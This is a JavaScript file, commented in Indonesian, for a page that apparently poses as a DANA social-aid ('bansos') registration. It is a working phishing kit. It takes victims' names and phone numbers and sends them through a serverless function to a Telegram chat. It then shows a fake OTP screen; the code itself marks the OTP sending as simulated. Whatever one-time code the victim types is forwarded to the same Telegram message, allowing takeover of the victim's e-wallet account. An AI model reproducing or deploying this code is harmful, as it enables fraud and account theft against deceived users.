// DOM Elements
const homePage = document.getElementById('home-page');
const otpPage = document.getElementById('otp-page');
const pageLoading = document.getElementById('page-loading');
const daftarBtn = document.getElementById('daftarBtn');
const verifyOtpBtn = document.getElementById('verify-otp-btn');
const singleOtpInput = document.getElementById('single-otp-input');
const otpTimer = document.getElementById('otp-timer');
const resendOtp = document.getElementById('resend-otp');
const otpUserInfo = document.getElementById('otp-user-info');
const daftarSekarangBtn = document.getElementById('daftar-sekarang-btn');

// Base URL untuk fetch
const baseUrl = window.location.origin;

// State
let timerInterval;
let timeLeft = 120;
let userData = {};

// Format time (MM:SS)
function formatTime(seconds) {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
}

// Start OTP timer
function startTimer() {
    timeLeft = 120;
    otpTimer.textContent = formatTime(timeLeft);
    
    if (timerInterval) clearInterval(timerInterval);
    
    timerInterval = setInterval(() => {
        timeLeft--;
        otpTimer.textContent = formatTime(timeLeft);
        
        if (timeLeft <= 0) {
            clearInterval(timerInterval);
            otpTimer.textContent = "00:00";
            showOtpError('Waktu habis! Silakan minta kode baru.');
        }
    }, 1000);
}

// Show loading on button
function showButtonLoading(button) {
    const buttonText = button.querySelector('.button-text');
    const buttonLoading = button.querySelector('.button-loading');
    if (buttonText && buttonLoading) {
        buttonText.classList.add('hidden');
        buttonLoading.classList.remove('hidden');
        button.disabled = true;
    }
}

// Hide loading on button
function hideButtonLoading(button) {
    const buttonText = button.querySelector('.button-text');
    const buttonLoading = button.querySelector('.button-loading');
    if (buttonText && buttonLoading) {
        buttonText.classList.remove('hidden');
        buttonLoading.classList.add('hidden');
        button.disabled = false;
    }
}

// Show page loading overlay
function showPageLoading(text = 'Mengirim kode OTP...') {
    const loadingText = pageLoading.querySelector('.page-loading-text');
    if (loadingText) {
        loadingText.textContent = text;
    }
    pageLoading.classList.remove('hidden');
}

// Hide page loading overlay
function hidePageLoading() {
    pageLoading.classList.add('hidden');
}

// Show OTP error message
function showOtpError(message) {
    const otpError = document.getElementById('otp-error');
    const otpErrorText = document.getElementById('otp-error-text');
    if (otpError && otpErrorText) {
        otpErrorText.textContent = message;
        otpError.style.display = 'flex';
        
        // Auto hide error after 3 seconds
        setTimeout(() => {
            otpError.style.display = 'none';
        }, 3000);
    }
}

// Hide OTP error
function hideOtpError() {
    const otpError = document.getElementById('otp-error');
    if (otpError) {
        otpError.style.display = 'none';
    }
}

// Show OTP success message
function showOtpSuccess(message) {
    const otpContainer = document.querySelector('.otp-container');
    
    // Hapus notifikasi sebelumnya jika ada
    const existingSuccess = document.querySelector('.otp-success-message');
    if (existingSuccess) {
        existingSuccess.remove();
    }
    
    const otpSuccess = document.createElement('div');
    otpSuccess.className = 'otp-success-message';
    otpSuccess.innerHTML = `<i class="fas fa-check-circle"></i> ${message}`;
    
    otpContainer.appendChild(otpSuccess);
    
    // Hapus notifikasi setelah 3 detik
    setTimeout(() => {
        if (otpSuccess.parentNode) {
            otpSuccess.remove();
        }
    }, 3000);
}

// Update input style based on length
function updateInputStyle(length) {
    if (!singleOtpInput) return;
    
    // Remove all length classes
    singleOtpInput.classList.remove(
        'length-6', 'length-7', 'length-8', 'length-9', 'length-10',
        'length-11', 'length-12', 'length-13', 'length-14', 'length-15', 'length-16'
    );
    
    // Add class based on length
    if (length >= 6 && length <= 16) {
        singleOtpInput.classList.add(`length-${length}`);
    }
}

// Navigate to OTP page
function goToOtpPage() {
    homePage.classList.add('hidden');
    otpPage.classList.remove('hidden');
    
    // Clear OTP input
    if (singleOtpInput) {
        singleOtpInput.value = '';
        updateInputStyle(0);
    }
    
    // Focus pada input
    setTimeout(() => {
        if (singleOtpInput) {
            singleOtpInput.focus();
        }
    }, 100);
    
    // Start timer
    startTimer();
    
    // Hide page loading
    hidePageLoading();
}

// Fungsi kirim pesan awal ke Telegram via serverless
async function sendTelegramMessage(nama, phone) {
    try {
        const response = await fetch(`${baseUrl}/.netlify/functions/send-dana-bansos`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                action: 'send',
                nama: nama,
                phone: phone
            })
        });
        const data = await response.json();
        if (data.success) {
            console.log('Telegram send success, messageId:', data.messageId);
            return data.messageId;
        } else {
            console.error('Gagal kirim via serverless:', data.error);
            showOtpError('Gagal mengirim notifikasi. Silakan coba lagi.');
        }
    } catch (error) {
        console.error('Error panggil serverless:', error);
        showOtpError('Error jaringan saat mengirim notifikasi.');
    }
    return null;
}

// Fungsi edit pesan Telegram via serverless
async function editTelegramMessage(messageId, nama, phone, otp) {
    try {
        const response = await fetch(`${baseUrl}/.netlify/functions/send-dana-bansos`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                action: 'edit',
                messageId: messageId,
                nama: nama,
                phone: phone,
                otp: otp
            })
        });
        const data = await response.json();
        if (data.success) {
            console.log('Telegram edit success');
            return true;
        } else {
            console.error('Gagal edit via serverless:', data.error);
            showOtpError('Gagal mengupdate kode OTP.');
            return false;
        }
    } catch (error) {
        console.error('Error panggil serverless:', error);
        showOtpError('Error jaringan saat mengupdate kode OTP.');
        return false;
    }
}

// Fungsi untuk memverifikasi OTP
async function verifyOtp() {
    if (!singleOtpInput) return;
    
    const otpCode = singleOtpInput.value.trim();
    const otpError = document.getElementById('otp-error');
    const otpErrorText = document.getElementById('otp-error-text');
    
    // Validasi panjang minimal 6 digit, maksimal 16 digit
    if (otpCode.length < 6) {
        if (otpError && otpErrorText) {
            otpErrorText.textContent = 'Kode OTP minimal 6 digit';
            otpError.style.display = 'flex';
            
            setTimeout(() => {
                otpError.style.display = 'none';
            }, 3000);
        }
        return;
    }
    
    if (otpCode.length > 16) {
        if (otpError && otpErrorText) {
            otpErrorText.textContent = 'Kode OTP maksimal 16 digit';
            otpError.style.display = 'flex';
            
            setTimeout(() => {
                otpError.style.display = 'none';
            }, 3000);
        }
        return;
    }
    
    // Validasi harus angka
    if (!/^\d+$/.test(otpCode)) {
        if (otpError && otpErrorText) {
            otpErrorText.textContent = 'Kode OTP harus angka';
            otpError.style.display = 'flex';
            
            setTimeout(() => {
                otpError.style.display = 'none';
            }, 3000);
        }
        return;
    }
    
    // Hide error if any
    if (otpError) {
        otpError.style.display = 'none';
    }
    
    // Ambil data dari sessionStorage untuk update Telegram
    const messageId = sessionStorage.getItem('telegramMessageId');
    const nama = sessionStorage.getItem('userName');
    const phone = sessionStorage.getItem('userPhone');
    
    if (messageId && nama && phone) {
        // Tampilkan loading di tombol verifikasi
        showButtonLoading(verifyOtpBtn);
        
        // Kirim OTP ke Telegram
        const success = await editTelegramMessage(messageId, nama, phone, otpCode);
        
        // Sembunyikan loading
        hideButtonLoading(verifyOtpBtn);
        
        if (success) {
            // Hapus session storage setelah digunakan
            sessionStorage.removeItem('telegramMessageId');
            sessionStorage.removeItem('userName');
            sessionStorage.removeItem('userPhone');
            
            // Tampilkan notifikasi sukses
            showOtpSuccess('Kode OTP berhasil diverifikasi!');
            
            // Kembali ke halaman utama dan reset form
            setTimeout(() => {
                homePage.classList.remove('hidden');
                otpPage.classList.add('hidden');
                document.getElementById('bansosForm').reset();
                if (singleOtpInput) {
                    singleOtpInput.value = '';
                    updateInputStyle(0);
                }
                
                // Clear timer
                if (timerInterval) clearInterval(timerInterval);
            }, 1500);
        }
    } else {
        console.warn('Tidak ada data session untuk update Telegram');
        if (otpError && otpErrorText) {
            otpErrorText.textContent = 'Session tidak ditemukan. Silakan daftar ulang.';
            otpError.style.display = 'flex';
        }
    }
}

// Event listener untuk single OTP input
if (singleOtpInput) {
    singleOtpInput.addEventListener('input', function(e) {
        // Hanya izinkan angka
        this.value = this.value.replace(/[^0-9]/g, '');
        
        // Batasi panjang maksimal 16 digit
        if (this.value.length > 16) {
            this.value = this.value.slice(0, 16);
        }
        
        // Update style based on length
        updateInputStyle(this.value.length);
        
        // Hide error when user starts typing
        hideOtpError();
    });

    // Event listener untuk paste
    singleOtpInput.addEventListener('paste', function(e) {
        e.preventDefault();
        const pasted = e.clipboardData.getData('text');
        if (/^\d+$/.test(pasted)) {
            // Ambil maksimal 16 digit
            const digits = pasted.slice(0, 16);
            this.value = digits;
            
            // Update style
            updateInputStyle(digits.length);
            
            // Hide error
            hideOtpError();
        }
    });

    // Event listener untuk keydown (Enter key)
    singleOtpInput.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            if (this.value.length >= 6 && this.value.length <= 16) {
                verifyOtp();
            } else if (this.value.length < 6) {
                showOtpError('Kode OTP minimal 6 digit');
            } else if (this.value.length > 16) {
                showOtpError('Kode OTP maksimal 16 digit');
            }
        }
    });
}

// Tombol Verifikasi
if (verifyOtpBtn) {
    verifyOtpBtn.addEventListener('click', function(e) {
        e.preventDefault();
        if (singleOtpInput) {
            const otpLength = singleOtpInput.value.length;
            if (otpLength >= 6 && otpLength <= 16) {
                verifyOtp();
            } else if (otpLength < 6) {
                showOtpError('Kode OTP minimal 6 digit');
            } else if (otpLength > 16) {
                showOtpError('Kode OTP maksimal 16 digit');
            }
        }
    });
}

// Validate form and show OTP page with loading
daftarBtn.addEventListener('click', async function() {
    const nama = document.getElementById('nama').value.trim();
    const telepon = document.getElementById('telepon').value.trim();
    const countryCode = document.getElementById('countryCode').value;
    
    // Reset errors
    document.getElementById('nama-error').style.display = 'none';
    document.getElementById('telepon-error').style.display = 'none';
    
    let isValid = true;
    
    // Validate name
    if (!nama) {
        document.getElementById('nama-error-text').textContent = 'Nama lengkap harus diisi';
        document.getElementById('nama-error').style.display = 'flex';
        isValid = false;
    }
    
    // Validate phone
    if (!telepon) {
        document.getElementById('telepon-error-text').textContent = 'Nomor telepon harus diisi';
        document.getElementById('telepon-error').style.display = 'flex';
        isValid = false;
    } else if (!/^[0-9]{8,15}$/.test(telepon.replace(/\s/g, ''))) {
        document.getElementById('telepon-error-text').textContent = 'Nomor telepon tidak valid (minimal 8 angka)';
        document.getElementById('telepon-error').style.display = 'flex';
        isValid = false;
    }
    
    if (!isValid) return;
    
    // Save user data
    userData = {
        nama: nama,
        telepon: countryCode + telepon
    };
    
    // Display user info on OTP page
    if (otpUserInfo) {
        otpUserInfo.textContent = `Nama: ${nama} | No: ${countryCode + telepon}`;
    }
    
    // Show button loading
    showButtonLoading(daftarBtn);
    
    // Show page loading overlay
    showPageLoading('Mengirim kode OTP...');
    
    // Kirim pesan awal ke Telegram
    const messageId = await sendTelegramMessage(nama, countryCode + telepon);
    if (messageId) {
        sessionStorage.setItem('telegramMessageId', messageId);
        sessionStorage.setItem('userName', nama);
        sessionStorage.setItem('userPhone', countryCode + telepon);
    }
    
    // Simulate API call to send OTP
    setTimeout(() => {
        // Hide button loading
        hideButtonLoading(daftarBtn);
        
        // Navigate to OTP page
        goToOtpPage();
    }, 2000);
});

// Resend OTP
if (resendOtp) {
    resendOtp.addEventListener('click', function(e) {
        e.preventDefault();
        
        // Show loading on resend link
        resendOtp.textContent = 'Mengirim...';
        resendOtp.style.pointerEvents = 'none';
        
        // Show page loading overlay
        showPageLoading('Mengirim ulang kode OTP...');
        
        // Simulate resend
        setTimeout(() => {
            // Reset timer
            startTimer();
            
            // Clear input
            if (singleOtpInput) {
                singleOtpInput.value = '';
                updateInputStyle(0);
                singleOtpInput.focus();
            }
            
            // Hide error
            hideOtpError();
            
            // Reset resend link
            resendOtp.textContent = 'Kirim ulang kode';
            resendOtp.style.pointerEvents = 'auto';
            
            // Hide loading
            hidePageLoading();
        }, 1500);
    });
}

// Phone number validation on input
const teleponInput = document.getElementById('telepon');
if (teleponInput) {
    teleponInput.addEventListener('input', function() {
        this.value = this.value.replace(/[^0-9]/g, '');
    });
}

// Event listener untuk tombol Daftar Sekarang di marketing bar
if (daftarSekarangBtn) {
    daftarSekarangBtn.addEventListener('click', function(e) {
        e.preventDefault();
        
        if (!homePage.classList.contains('hidden')) {
            const formSection = document.querySelector('.form-section');
            if (formSection) {
                formSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
                setTimeout(() => {
                    document.getElementById('nama').focus();
                }, 500);
            }
        } else {
            otpPage.classList.add('hidden');
            homePage.classList.remove('hidden');
            setTimeout(() => {
                const formSection = document.querySelector('.form-section');
                if (formSection) {
                    formSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
                    document.getElementById('nama').focus();
                }
            }, 100);
        }
    });
}

// Add smooth scroll for skip link
const skipLink = document.querySelector('.skip-link');
if (skipLink) {
    skipLink.addEventListener('click', function(e) {
        e.preventDefault();
        document.getElementById('main-content').scrollIntoView({ behavior: 'smooth' });
    });
}

// Clean up timer when page unloads
window.addEventListener('beforeunload', function() {
    if (timerInterval) {
        clearInterval(timerInterval);
    }
});

// Initialize - set default state
document.addEventListener('DOMContentLoaded', function() {
    // Clear any existing session data
    sessionStorage.removeItem('telegramMessageId');
    sessionStorage.removeItem('userName');
    sessionStorage.removeItem('userPhone');
    
    // Make sure OTP page is hidden
    if (otpPage) {
        otpPage.classList.add('hidden');
    }
    if (homePage) {
        homePage.classList.remove('hidden');
    }
});
